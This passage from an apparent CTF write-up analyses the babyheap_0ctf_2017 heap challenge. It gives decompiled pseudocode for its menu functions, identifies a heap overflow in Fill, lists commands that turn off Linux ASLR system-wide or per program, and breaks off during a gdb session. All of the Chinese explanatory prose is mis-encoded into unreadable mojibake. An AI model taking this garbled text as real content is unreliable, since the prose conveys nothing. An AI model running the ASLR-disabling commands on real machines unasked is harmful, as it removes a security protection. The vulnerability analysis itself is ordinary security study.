setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  alarm(<span class="hljs-number">60u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"===== Baby Heap in 2017 ====="</span>);<br>  fd = open(<span class="hljs-string">"/dev/urandom"</span>, <span class="hljs-number">0</span>);                 <span class="hljs-comment">// è°ƒç”¨ç³»ç»Ÿæ–‡ä»¶ç”Ÿæˆéšæœºæ•°</span><br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> || read(fd, buf, <span class="hljs-number">0x10</span>uLL) != <span class="hljs-number">16</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  close(fd);<br>  addr = (<span class="hljs-type">char</span> *)((buf[<span class="hljs-number">0</span>] % <span class="hljs-number">0x555555543000</span>uLL + <span class="hljs-number">0x10000</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000</span>LL);<br>  v3 = (buf[<span class="hljs-number">1</span>] % <span class="hljs-number">0xE80</span>uLL) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL;<br>  <span class="hljs-keyword">if</span> ( mmap(addr, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>) != addr )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">return</span> &amp;addr[v3];                             <span class="hljs-comment">// åˆ©ç”¨ç”Ÿæˆçš„éšæœºæ•°æ¥ç”Ÿæˆéšæœºåœ°å€</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>â€‹è¿™ä¸ªå‡½æ•°å¯ä»¥ä½¿ç¨‹åºå †å—ä¿¡æ¯å­˜æ”¾åœ¨éšæœºåœ°å€ä¸­ï¼Œè€Œä¸æ˜¯å›ºå®šçš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆéš¾é€šè¿‡æ‰¾åˆ°å­˜æ”¾å †å—ä¿¡æ¯çš„åœ°å€æ¥ä¿®æ”¹å…¶åœ°å€ä»è€Œæ§åˆ¶ç¨‹åºçš„æµç¨‹ã€‚<br>â€‹è¿˜éœ€è¦æä¸€å¥çš„æ˜¯ï¼Œè¿™ä¸ªå‡½æ•°æœ‰alarmå‡½æ•°ï¼Œä»ç¨‹åºè¿è¡Œ60ç§’ä¹‹åå°±ä¼šç»ˆæ­¢è¿›ç¨‹ï¼Œå¦‚æœä¸æƒ³åœ¨è°ƒè¯•ç¨‹åºçš„æ—¶å€™è¢«æ‰“æ–­ï¼Œå¯ä»¥å¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œpatchã€‚patchä¹‹åçš„å¯æ‰§è¡Œæ–‡ä»¶åä¸ºï¼šbabyheap_0ctf_2017_patch</p><p>è¿”å›çš„addr æŒ‡é’ˆ åŒ…å«äº† æ‰€æœ‰chunk çš„ ä¿¡æ¯å’Œ æ•°æ®chunk çš„æŒ‡é’ˆ</p><h3 id="meau-å‡½æ•°"><a href="#meau-å‡½æ•°" class="headerlink" title="meau å‡½æ•°"></a>meau å‡½æ•°</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1. Allocate"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2. Fill"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3. Free"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4. Dump"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5. Exit"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Command: "</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>æ‰“å°èœå•</p><h3 id="Alloc-å‡½æ•°"><a href="#Alloc-å‡½æ•°" class="headerlink" title="Alloc å‡½æ•°"></a>Alloc å‡½æ•°</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Allocate</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">void</span> *calloc_ptr; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( !*(_DWORD *)(<span class="hljs-number">24LL</span> * i + a1) )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>      size = input();<br>      <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0</span> )<br>      {<br>        <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">4096</span> )<br>          size = <span class="hljs-number">4096</span>;<br>        calloc_ptr = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-number">1uLL</span>);<br>        <span class="hljs-keyword">if</span> ( !calloc_ptr )<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        *(_DWORD *)(<span class="hljs-number">24LL</span> * i + a1) = <span class="hljs-number">1</span>;<span class="hljs-comment">//chunk_flag</span><br>        *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i + <span class="hljs-number">8</span>) = size;<span class="hljs-comment">//chunk_size</span><br>        *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i + <span class="hljs-number">16</span>) = calloc_ptr;<span class="hljs-comment">//chunk_data_ptr æŒ‡å‘callocå‡ºæ¥çš„chunk_data</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Allocate Index %d\n"</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i);<br>      }<br>      <span class="hljs-keyword">return</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>ä¼ å…¥çš„å‚æ•°åœ°å€æ˜¯get_addr éšæœºç”Ÿæˆçš„åœ°å€ã€‚allocateå‡½æ•°æ˜¯æ¥åˆ›å»ºå †å—çš„ï¼Œç”³è¯·chunkæœ€å¤§çš„å¤§å°ä¸º4096ã€‚</p><p>é¦–å…ˆè¾“å…¥å †å—çš„content_sizeï¼Œç„¶åè°ƒç”¨callocå‡½æ•°æ ¹æ®è¾“å…¥çš„content_sizeå¤§å°æ¥åˆ›å»ºå †å—ï¼Œæœ€åå †å—çš„ä¿¡æ¯ä¿å­˜åœ¨get_addræŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ä¸­ã€‚éœ€è¦æ³¨æ„çš„æ˜¯å †å—æ˜¯ç”± calloc åˆ†é…çš„ï¼Œæ‰€ä»¥ chunk ä¸­çš„å†…å®¹å…¨éƒ½ä¸º\x00ã€‚<br>è¯·æ³¨æ„ï¼Œå †å—çš„indexæ˜¯ä»0å¼€å§‹çš„<br>å› æ­¤ç¨‹åºçš„ç»“æ„ä½“ä¸ºï¼š</p><blockquote><p>â—chunk_flag:ç”¨æ¥åˆ¤æ–­å †å—æ˜¯å¦å­˜åœ¨<br>â—chunk_content_size:#è®°å½•contentçš„å¤§å°<br>â—chunk_data_ptr:æŒ‡å‘callocå‡ºæ¥çš„chunk_data</p></blockquote><h3 id="Fill-å‡½æ•°"><a href="#Fill-å‡½æ•°" class="headerlink" title="Fill å‡½æ•°"></a>Fill å‡½æ•°</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Fill</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<span class="hljs-comment">//åˆ¤æ–­åºå·æ˜¯å¦æ­£ç¡®ï¼Œåˆ¤æ–­flagä¸º chunk æ˜¯å¦å­˜åœ¨</span><br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>    v2 = input();<span class="hljs-comment">//åˆè®©è¾“å‡ºsizeï¼Œæ”¹å†™ chunk æ•°æ®éƒ¨åˆ†çš„å†…å®¹,å­˜åœ¨æº¢å‡º!!</span><br>    <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0</span> )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content: "</span>);<br>      read_func2(*(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>), v2); <span class="hljs-comment">//*(_QWORD *)(24LL * v1 + a1 + 16) == chunk_data</span><br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>ä¸Šå›¾æ˜¯Fillå‡½æ•°åˆ†ä¼ªä»£ç ï¼Œè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ¯”è¾ƒæœ‰æ„æ€ï¼Œæ¼æ´ä¹Ÿæ˜¯å­˜åœ¨è¿™ä¸ªå‡½æ•°ä¸­çš„ã€‚<br>åœ¨å¡«å……å†…å®¹çš„åŠŸèƒ½ä¸­ï¼Œè°ƒç”¨inputå‡½æ•°æ¥è¾“å…¥å †å—çš„å¤§å°ï¼Œå¹¶æ²¡æœ‰è®¾ç½®å­—ç¬¦ä¸²ç»“å°¾ã€‚è€Œä¸”æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯ï¼Œè¿™æ¬¡åˆè®©æˆ‘ä»¬é‡æ–°è¾“å…¥äº†content_sizeï¼Œä½†æ˜¯ç¨‹åºå¹¶æ²¡æœ‰å°†åŸæ¥ç»“æ„ä½“ä¸­çš„content_sizeæ›´æ”¹ã€‚ä¸”æ‰§è¡Œè¿™ä¸ªå‡½æ•°ä¹‹åallocate chunkæ—¶å †å—çš„sizeåŸŸæ²¡æœ‰æ”¹å˜ï¼Œæ‰€ä»¥è¿™é‡Œå°±å‡ºç°äº†ä»»æ„å †æº¢å‡ºçš„æƒ…å½¢ã€‚</p><h3 id="Free-å‡½æ•°"><a href="#Free-å‡½æ•°" class="headerlink" title="Free å‡½æ•°"></a>Free å‡½æ•°</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Free</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<br>  {<br>    *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) = <span class="hljs-number">0</span>;<br>    *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">8</span>) = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>));<br>    *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>) = <span class="hljs-number">0LL</span>;     <span class="hljs-comment">// æŒ‡é’ˆç½®ç©º</span><br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>è¾“å…¥åºå·ï¼Œé‡Šæ”¾chunkã€‚å°† flag å­—æ®µï¼Œsize å­—æ®µæ¸…0ï¼Œfreeäº†æ•°æ®chunkçš„æŒ‡é’ˆåŒæ—¶ä¹Ÿæ¸…0ï¼Œä¸å­˜åœ¨uaf</p><h3 id="Dump-å‡½æ•°"><a href="#Dump-å‡½æ•°" class="headerlink" title="Dump å‡½æ•°"></a>Dump å‡½æ•°</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Dump</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Content: "</span>);<br>    write_func(*(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>), *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">8</span>));<br>    <span class="hljs-built_in">puts</span>(byte_14F1);<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>è¾“å…¥åºå·ï¼Œæ‰“å°å†…å®¹</p><h2 id="gdb-åŠ¨æ€è°ƒè¯•"><a href="#gdb-åŠ¨æ€è°ƒè¯•" class="headerlink" title="gdb åŠ¨æ€è°ƒè¯•"></a>gdb åŠ¨æ€è°ƒè¯•</h2><p>è¿˜è®°å¾—ä¹‹å‰get_addrè¿™ä¸ªå‡½æ•°å—ï¼Ÿè¿™ä¸ªå‡½æ•°ä¸»è¦ä½¿ç”¨æ¥ç”Ÿæˆéšæœºåœ°å€ï¼Œå…¶ä¸­æŒ‡é’ˆä¹Ÿå­˜æ”¾åœ¨å“ªé‡Œã€‚</p><h3 id="å…³é—­ASLRä¿æŠ¤"><a href="#å…³é—­ASLRä¿æŠ¤" class="headerlink" title="å…³é—­ASLRä¿æŠ¤"></a>å…³é—­ASLRä¿æŠ¤</h3><p>ç”±äºè¿™ä¸ªç¨‹åºå¼€å¯äº†PIEä¿æŠ¤ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ç¨‹åºåŠæŸ¥çœ‹å †å†…å­˜ï¼Œå› æ­¤æˆ‘ä»¬å°†Linuxçš„ALSR(åœ°å€ç©ºé—´éšæœºåŒ–)è¿›è¡Œå…³é—­ã€‚é¦–å…ˆçœ‹ä¸€ä¸‹ALSRå¼€å¯çš„çŠ¶æ€ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ä»»æ„å…¶ä¸­ä¸€ç§å‘½ä»¤</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">ubuntu@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space<br><span class="hljs-number">2</span><br>ubuntu@ubuntu:~$ sysctl -a --pattern randomize<br>kernel.randomize_va_space = <span class="hljs-number">2</span><br>ubuntu@ubuntu:~$<br><br>###<br><span class="hljs-number">0</span> = å…³é—­<br><span class="hljs-number">1</span> = åŠéšæœºã€‚å…±äº«åº“ã€æ ˆã€mmap() ä»¥åŠ VDSO å°†è¢«éšæœºåŒ–ã€‚ï¼ˆPIEä¹Ÿä¼šå½±å“heapçš„éšæœºåŒ–ï¼‰<br><span class="hljs-number">2</span> = å…¨éšæœºã€‚é™¤äº†<span class="hljs-number">1</span>ä¸­æ‰€è¿°ï¼Œè¿˜æœ‰heapã€‚<br>###<br></code></pre></td></tr></tbody></table></figure><p>ç°åœ¨å…³é—­ASLRï¼Œå…³é—­æ–¹æ³•å¦‚ä¸‹ï¼š<br><strong>æ–¹æ³•ä¸€ï¼š æ‰‹åŠ¨ä¿®æ”¹randomize_va_spaceæ–‡ä»¶</strong><br>ä¸Šé¢ä»‹ç»çš„randomize_va_spaceæ–‡ä»¶çš„æšä¸¾å€¼å«ä¹‰ï¼Œè®¾ç½®çš„å€¼ä¸åŒï¼Œlinuxå†…æ ¸åŠ è½½ç¨‹åºçš„åœ°å€ç©ºé—´çš„ç­–ç•¥å°±ä¼šä¸åŒã€‚æ¯”è¾ƒç®€å•æ˜äº†ã€‚è¿™é‡Œ0ä»£è¡¨å…³é—­ASLRã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-number">0</span> &gt; /proc/sys/kernel/randomize_va_space<br>#æ³¨æ„ï¼Œè¿™é‡Œæ˜¯å…ˆè¿›rootæƒé™ï¼Œåæ‰§è¡Œã€‚<br>#é‡å¯ä¹‹åä¼šæ¢å¤é»˜è®¤<br></code></pre></td></tr></tbody></table></figure><p><strong>æ–¹æ³•äºŒï¼š ä½¿ç”¨sysctlæ§åˆ¶ASLR</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">sysctl -w kernel.randomize_va_space=<span class="hljs-number">0</span><br>#é‡å¯ä¹‹åå°†æ¢å¤é»˜è®¤<br>#å¦‚æœéœ€è¦æ°¸ä¹…ä¿å­˜é…ç½®ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶ /etc/sysctl.conf ä¸­å¢åŠ è¿™ä¸ªé€‰é¡¹ã€‚<br></code></pre></td></tr></tbody></table></figure><p><strong>æ–¹æ³•ä¸‰ï¼š ä½¿ç”¨setarchæ§åˆ¶å•ä¸ªç¨‹åºçš„éšæœºåŒ–</strong><br>å¦‚æœä½ æƒ³å†å²å…³é—­å•ä¸ªç¨‹åºçš„ASLRï¼Œä½¿ç”¨setarchæ˜¯å¾ˆå¥½çš„é€‰æ‹©ã€‚setarchå‘½ä»¤å¦‚å…¶åï¼Œæ”¹å˜ç¨‹åºçš„è¿è¡Œæ¶æ„ç¯å¢ƒï¼Œå¹¶å¯ä»¥è‡ªå®šä¹‰ç¯å¢ƒflagã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">setarch `uname -m` -R ./your_program<br>#-Rå‚æ•°ä»£è¡¨å…³é—­åœ°å€ç©ºé—´éšæœºåŒ–ï¼ˆå¼€å¯ADDR_NO_RANDOMIZE)<br></code></pre></td></tr></tbody></table></figure><p><strong>æ–¹æ³•å››ï¼š åœ¨GDBåœºæ™¯ä¸‹ï¼Œä½¿ç”¨set disable-randomization off</strong><br>åœ¨è°ƒè¯•ç‰¹å®šç¨‹åºæ—¶ï¼Œå¯ä»¥é€šè¿‡set disable-randomizationå‘½ä»¤å¼€å¯æˆ–è€…å…³é—­åœ°å€ç©ºé—´éšæœºåŒ–ã€‚é»˜è®¤æ˜¯å…³é—­éšæœºåŒ–çš„ï¼Œä¹Ÿå°±æ˜¯onçŠ¶æ€ã€‚<br>å½“ç„¶ï¼Œè¿™é‡Œå¼€å¯ï¼Œå…³é—­å’ŒæŸ¥çœ‹çš„æ–¹æ³•çœ‹èµ·æ¥å°±æ¯”è¾ƒæ­£è§„äº†ã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">å…³é—­ASLRï¼š<br><span class="hljs-built_in">set</span> disable-randomization on<br>å¼€å¯ASLRï¼š<br><span class="hljs-built_in">set</span> disable-randomization off<br>æŸ¥çœ‹ASLRçŠ¶æ€ï¼š<br>show disable-randomization<br></code></pre></td></tr></tbody></table></figure><p>æˆ‘ä»¬å¦‚ä½•æ‰¾åˆ°é‚£ä¸ªéšæœºåœ°å€å‘¢ï¼Ÿé€šè¿‡å¤šæ¬¡å¯¹ç¨‹åºgdbè°ƒè¯•ï¼Œå‘ç°äº†ä¸€ç›´å˜åŒ–çš„åœ°å€ï¼ˆæ­¤æ—¶çš„ASLRå·²å…³é—­ï¼Œå‚è§ä¸‹æ–‡ç« ä¸‹é¢çš„å†…å®¹ï¼‰ï¼Œä¸‹é¢çš„ä»£ç æ¡†ä¹‹ä¸­æ˜¯ä¸¤æ¬¡gdbè°ƒè¯•çš„å†…å­˜åˆ†å¸ƒï¼š</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/8hD1tAzmP27Y3ky.png'><img src="https://s2.loli.net/2023/09/13/8hD1tAzmP27Y3ky.png" alt="Snipaste_2023-09-13_15-53-21.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/gYnAKZ5RxtcXfPH.png'><img src="https://s2.loli.net/2023/09/13/gYnAKZ5RxtcXfPH.png" alt="Snipaste_2023-09-13_15-54-08.png"></p><p>é€šè¿‡å¯¹æ¯”å‘ç°ï¼Œå˜åŠ¨çš„åªæœ‰ç¬¬ä¸€è¡Œçš„åœ°å€ï¼š</p><p>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    0x40729d6e2000     0x40729d6e3000 rw-p     1000 0 </p><p>â€‹    0x2dd727226000     0x2dd727227000 rw-p     1000 0 </p><p>åˆ°è¿™é‡Œï¼Œå¯ä»¥çŒœæµ‹ä¸€ä¸‹ï¼Œç¨‹åºçš„æŒ‡é’ˆåº”è¯¥ä¹Ÿå­˜æ”¾åœ¨è¿™ç‰‡å†…å­˜åŒºåŸŸä¸­ã€‚<br>æˆ‘ä»¬é‡æ–°gdbè°ƒè¯•ï¼Œé€šè¿‡æ‰§è¡Œå‡½æ•°Allocateå’Œfillï¼Œæ¥çœ‹ä¸€ä¸‹è¿™ç‰‡å†…å­˜ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c">giantbranch@ubuntu:/mnt/hgfs/PWNé¢˜/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0c<br>tf_2017$ gdb babyheap_0ctf_2017<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 175 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from babyheap_0ctf_2017...<span class="hljs-params">(no debugging symbols found)</span>...done.<br>pwndbg&gt; r<br>Starting program: /mnt/hgfs/PWNé¢˜/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017 <br>===== Baby Heap in <span class="hljs-number">2017</span> =====<br><span class="hljs-number">1.</span> Allocate<br><span class="hljs-number">2.</span> Fill<br><span class="hljs-number">3.</span> Free<br><span class="hljs-number">4.</span> Dump<br><span class="hljs-number">5.</span> Exit<br>Command: <span class="hljs-number">1</span><br>Size: <span class="hljs-number">20</span><br>Allocate Index <span class="hljs-number">0</span><br><span class="hljs-number">1.</span> Allocate<br><span class="hljs-number">2.</span> Fill<br><span class="hljs-number">3.</span> 